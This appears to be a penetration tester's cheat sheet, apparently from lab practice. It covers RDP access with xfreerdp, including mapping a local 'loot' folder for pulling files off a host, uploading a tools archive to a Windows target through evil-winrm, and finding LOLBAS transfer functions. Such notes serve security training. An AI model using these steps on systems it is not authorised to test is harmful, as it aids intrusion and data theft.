To search for functions of **Download** and **Upload** in [LOLBAS](https://lolbas-project.github.io) we can use `/download` or  `/upload`.

---

### RDP

```
 xfreerdp /u:<user> /d:<domain /v:<IP>
```

ex:

```
 xfreerdp /u:yoshi /d:medtech.com /v:172.16.232.82
```

```
xfreerdp /u:yoshi /d:medtech.com /v:172.16.232.80 +clipboard /drive:loot,/home/gnar/loot
```

| Option                           | Purpose                                                                         |
| -------------------------------- | ------------------------------------------------------------------------------- |
| `/u:user`                        | Username for the remote system                                                  |
| `/p:pass`                        | Password                                                                        |
| `/v:target_ip`                   | IP or hostname of the RDP target                                                |
| `+clipboard`                     | Enables **clipboard sync** (copy/paste text/files)                              |
| `/drive:shared,/full/local/path` | Maps a **local folder** into the remote session as a drive (for file transfers) |



---

## Transfer Tools to Target Windows Host

```bash

# Zip it on your attack machine:
zip -r tools.zip ./Windows/

# In evil-winrm:
upload /home/gnar/Toon/172.16.x.x/tools.zip

# Unzip on target:
# Powershell
Expand-Archive -Path "C:\Users\j.doe\Documents\tools.zip" -DestinationPath "C:\Users\j.doe\Documents\tools" -Force
```

---
